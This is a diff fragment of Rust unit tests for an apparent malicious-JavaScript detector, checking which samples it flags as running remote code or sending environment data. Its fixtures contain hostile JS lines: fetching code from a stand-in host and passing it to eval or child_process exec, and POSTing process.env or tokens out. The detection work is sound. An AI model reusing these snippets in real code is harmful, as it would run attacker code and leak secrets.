+        let itself = "const http = require('http');\nfunction makeApp(cfg) { return { url: 'http://localhost:' + cfg.port, cfg }; }\nconst server = http.createServer((req, res) => res.end('ok'));\nconst app = makeApp({ port: 3000, server });\neval(app.cfg.server.address().port.toString());\n";
+        assert_eq!(runs(itself), None);
+        let error = "const http = require('http');\nconst server = http.createServer();\nserver.on('error', (e) => eval(e.message));\n";
+        assert_eq!(runs(error), None);
+        // a Node module's objects are Node's: createHash(…).update(k) is not
+        // the script's update(), which other code's value would reach
+        let hash = format!(
+            "const https = require('https');\nconst {{ createHash }} = require('crypto');\nclass Doc {{ update(s, e, content) {{ this.c = content; }} toString() {{ return this.c; }} }}\n\
+             const d = new Doc();\nhttps.get('https://{}/x', (res) => {{ res.on('data', (k) => {{ createHash('sha1').update(k); }}); }});\neval(d.toString());\n",
+            HOST
+        );
+        assert_eq!(runs(&hash), None);
+        // createRequire makes a require, under any name, through a bundler's wrapper
+        let made = format!(
+            "import {{ createRequire }} from 'module';\nconst require = createRequire(import.meta.url);\n\
+             require('https').get('https://{}/x', (r) => {{ let b = ''; r.on('data', (c) => {{ b += c; }}); r.on('end', () => eval(b)); }});\n",
+            HOST
+        );
+        assert_eq!(runs(&made), Some("run"));
+        let shim = format!(
+            "import {{ createRequire }} from 'node:module';\nvar __require = /* @__PURE__ */ (() => createRequire(import.meta.url))();\n\
+             const cp = __require('child_process');\nconst https = __require('https');\n\
+             https.get('https://{}/x', (r) => {{ let b = ''; r.on('data', (c) => {{ b += c; }}); r.on('end', () => cp.exec(b)); }});\n",
+            HOST
+        );
+        assert_eq!(runs(&shim), Some("run"));
+    }
+
+    #[test]
+    fn a_selection_of_the_environment_in_a_loop() {
+        let post = |v: &str| format!("fetch('https://{}/c', {{ method: 'POST', body: JSON.stringify({}) }});\n", HOST, v);
+        // a loop whose test selects variables by name (vite's loadEnv)
+        let src = format!("const env = {{}};\nfor (const k in process.env) if (k.startsWith('VITE_')) env[k] = process.env[k];\n{}", post("env"));
+        assert_eq!(sent(&src), None);
+        let src = format!(
+            "const env = {{}};\nfor (const k of Object.keys(process.env)) {{ if (k.startsWith('APP_')) {{ env[k] = process.env[k]; }} }}\n{}",
+            post("env")
+        );
+        assert_eq!(sent(&src), None);
+        // a test that excludes some, names secrets, or doesn't read the
+        // variable selects nothing: the whole environment
+        let src = format!("const env = {{}};\nfor (const k in process.env) if (!k.startsWith('npm_')) env[k] = process.env[k];\n{}", post("env"));
+        assert_eq!(sent(&src), found("environment", "the whole environment"));
+        let src = format!("const out = {{}};\nfor (const [k, v] of Object.entries(process.env)) if (k.includes('TOKEN')) out[k] = v;\n{}", post("out"));
+        assert_eq!(sent(&src), found("environment", "the whole environment"));
+        let src = format!(
+            "const env = {{}};\nconst verbose = process.argv.length > 2;\nfor (const k in process.env) {{ if (verbose) {{ env[k] = process.env[k]; }} }}\n{}",
+            post("env")
+        );
+        assert_eq!(sent(&src), found("environment", "the whole environment"));
+        // (a body that does more than test them: no selection)
+        let src = format!("const env = {{}};\nfor (const k in process.env) {{ env[k] = process.env[k]; if (k.startsWith('X_')) break; }}\n{}", post("env"));
+        assert_eq!(sent(&src), found("environment", "the whole environment"));
+        // what the names a test reads are given is its text: a list of secrets' patterns, a
+        // prefix parameter's default
+        let src = format!(
+            "const sensitive = [/TOKEN/i, /SECRET/i, /^AWS_/i];\nconst out = {{}};\n\
+             for (const [k, v] of Object.entries(process.env)) {{\n  if (sensitive.some((p) => p.test(k))) out[k] = v;\n}}\n{}",
+            post("out")
+        );
+        assert_eq!(sent(&src), found("environment", "the whole environment"));
+        let src = format!(
+            "function load(prefixes = ['VITE_']) {{\n  const env = {{}};\n\
+             for (const key in process.env) if (prefixes.some((p) => key.startsWith(p))) env[key] = process.env[key];\n  return env;\n}}\n{}",
+            post("load()")
+        );
+        assert_eq!(sent(&src), None);
+        // the .filter rule reads them the same way
+        let src = format!(
+            "const KEYS = ['GITHUB_TOKEN', 'NPM_TOKEN'];\nconst out = Object.entries(process.env).filter(([k]) => KEYS.includes(k));\n{}",
+            post("out")
+        );
+        assert_eq!(sent(&src), found("environment", "the whole environment"));
+    }
+
+    #[test]
+    fn what_the_in_sample_misses_do() {
+        // the request client (react-svg-helper-fast, react-zutils): its calls
+        // receive, through their callback, and its forks' and defaults' too
+        let run = |call: &str| format!("const request = require('request');\n{}, (e, r, body) => {{ eval(body); }});\n", call);
+        for call in [
+            format!("request({{ url: 'https://{}/a' }}", HOST),
+            format!("request('https://{}/a'", HOST),
+            format!("request.get('https://{}/a'", HOST),
+            format!("request.post({{ url: 'https://{}/a', form: {{}} }}", HOST),
+            format!("request.defaults({{ timeout: 5 }})('https://{}/a'", HOST),
+        ] {
+            assert_eq!(runs(&run(&call)), Some("run"), "{}", call);
+        }
+        let fork = format!("const r = require('@cypress/request');\nr.get('https://{}/a', (e, x, b) => eval(b));\n", HOST);
+        assert_eq!(runs(&fork), Some("run"));
+        // what it sends: its options' form, formData, body, json
+        let send = format!(
+            "const request = require('request');\nrequest.post({{ url: 'https://{}/c', form: {{ env: JSON.stringify(process.env) }} }}, () => {{}});\n",
+            HOST
+        );
+        assert_eq!(sent(&send), found("environment", "the whole environment"));
+        // a member named by a constant, as decoding leaves an obfuscated call
+        let named = format!("const x = require('request'), N = ('post', 'get');\nx[N]('https://{}/a', (e, r, b) => {{ eval(b); }});\n", HOST);
+        assert_eq!(runs(&named), Some("run"));
+        let module = format!("const i = 'request';\nconst x = require(i);\nx.get('https://{}/a', (e, r, b) => eval(b));\n", HOST);
+        assert_eq!(runs(&module), Some("run"));
+        // a parameter whose default is the script's own address is that
+        // address when its caller gives none (react-svg-helper-fast's getPlugin);
+        // one with no default, or a default its caller gives, is the caller's
+        let default = format!(
+            "const request = require('request');\nconst options = {{ url: 'https://{}/icons/' }};\n\
+             function getPlugin(token = '101', opts = options) {{\n  opts.url = `${{opts.url}}${{token}}`;\n  request(opts, (e, r, b) => {{ eval(JSON.parse(b).credits); }});\n}}\nmodule.exports = {{ getPlugin }};\n",
+            HOST
+        );
+        assert_eq!(runs(&default), Some("run"));
+        let given = "const request = require('request');\nfunction load(opts) {\n  request(opts, (e, r, b) => { eval(b); });\n}\nmodule.exports = load;\n";
+        assert_eq!(runs(given), None);
+        let from_caller = "const request = require('request');\nfunction load(base, opts = { url: base }) {\n  request(opts, (e, r, b) => { eval(b); });\n}\nmodule.exports = load;\n";
+        assert_eq!(runs(from_caller), None);
+    }
+
+    #[test]
+    fn instances_of_a_class_made_in_several_places() {
+        // each instance holds what it is given; one's members are not
+        // another's (every MagicString of vite's plugins)
+        let other = "class S { constructor(c) { this.c = c; } update(x) { this.c = this.c + x; return this; } toString() { return this.c; } }\n\
+                     const s1 = new S('a');\ns1.update(Buffer.from(process.argv[2], 'hex').toString());\nconst s2 = new S(process.argv[3]);\neval(s2.toString());\n";
+        assert_eq!(decoded(other), vec![]);
+        let same = "class S { constructor(c) { this.c = c; } update(x) { this.c = this.c + x; return this; } toString() { return this.c; } }\n\
+                    const s1 = new S('a');\ns1.update(Buffer.from(process.argv[2], 'hex').toString());\nconst s2 = new S('b');\neval(s1.toString());\n";
+        assert_eq!(decoded(same), vec![(5, 3)]);
+        let made = "class Box { constructor(v) { this.v = v; } get() { return this.v; } }\nconst a = new Box('x');\n\
+                    const b = new Box(Buffer.from(process.argv[2], 'base64').toString());\neval(b.get());\n";
+        assert_eq!(decoded(made), vec![(4, 3)]);
+        // what its methods read themselves is still every instance's
+        let fetched = format!(
+            "class Loader {{ constructor() {{ this.code = null; }} async load() {{ const r = await fetch('https://{}/p'); this.code = await r.text(); }} run() {{ eval(this.code); }} }}\n\
+             const l = new Loader();\nconst l2 = new Loader();\nl.load().then(() => l.run());\n",
+            HOST
+        );
+        assert_eq!(runs(&fetched), Some("run"));
+        // a class made once keeps one binding per member
+        let once = format!(
+            "class Runner {{ setCode(c) {{ this.c = c; }} run() {{ eval(this.c); }} }}\nconst r1 = new Runner();\n\
+             fetch('https://{}/p').then((x) => x.text()).then((t) => {{ r1.setCode(t); r1.run(); }});\n",
+            HOST
+        );
+        assert_eq!(runs(&once), Some("run"));
     }
 }
